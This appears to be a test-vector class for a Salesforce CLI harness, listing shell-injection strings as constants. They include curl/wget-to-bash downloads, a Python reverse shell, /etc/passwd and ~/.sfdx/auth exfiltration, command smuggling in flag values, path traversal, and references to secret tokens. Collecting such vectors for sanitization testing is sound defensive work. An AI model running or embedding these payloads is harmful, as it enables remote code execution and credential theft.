public class Escape_ShellInjection {
    /*
    Shell metacharacter injection test vectors.

    If the CLI harness passes any of these strings to a shell without
    proper sanitization, they could achieve code execution:
    */

    public static final String CMD_INJECT_1 = '$(curl http://localhost:8080/shell.sh|bash)';
    public static final String CMD_INJECT_2 = '`curl http://localhost:8080/shell.sh|bash`';
    public static final String CMD_INJECT_3 = '; curl http://localhost:8080/shell.sh|bash #';
    public static final String CMD_INJECT_4 = '| curl http://localhost:8080/shell.sh|bash';
    public static final String CMD_INJECT_5 = '&& curl http://localhost:8080/shell.sh|bash';
    public static final String CMD_INJECT_6 = '\n curl http://localhost:8080/shell.sh|bash';
    public static final String CMD_INJECT_7 = '$(cat /etc/passwd > /dev/tcp/localhost:8080/8080)';
    public static final String CMD_INJECT_8 = '|| wget -q -O- http://localhost:8080/rev.py | python3';
    public static final String CMD_INJECT_9 = '${IFS}cat${IFS}/etc/passwd';
    public static final String CMD_INJECT_10 = 'class$(IFS)name;id;#';
    public static final String CMD_INJECT_11 = '$(python3 -c "import socket,subprocess,os;s=socket.socket();s.connect((\'localhost:8080\',4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\'/bin/sh\',\'-i\'])")';
    public static final String CMD_INJECT_12 = '${BASH_ENV}';
    public static final String CMD_INJECT_13 = 'a]};curl${IFS}localhost:8080;#{';

    public static final String SFDX_INJECT_1 = '--json; curl http://localhost:8080/$(cat ~/.sfdx/auth)';
    public static final String SFDX_INJECT_2 = '--target-org"; cat /etc/passwd; echo "';
    public static final String SF_CLI_INJECT = '--flags-dir=../../../../../../tmp/malicious-flags';

    public static final String ENV_EXFIL_1 = '${SALESFORCE_AUTH_TOKEN}';
    public static final String ENV_EXFIL_2 = '${SF_ACCESS_TOKEN}';
    public static final String ENV_EXFIL_3 = '${SFDX_AUTH_URL}';
    public static final String ENV_EXFIL_4 = '${DATABASE_URL}';
    public static final String ENV_EXFIL_5 = '${AWS_SECRET_ACCESS_KEY}';

    public static void noop() {}
}
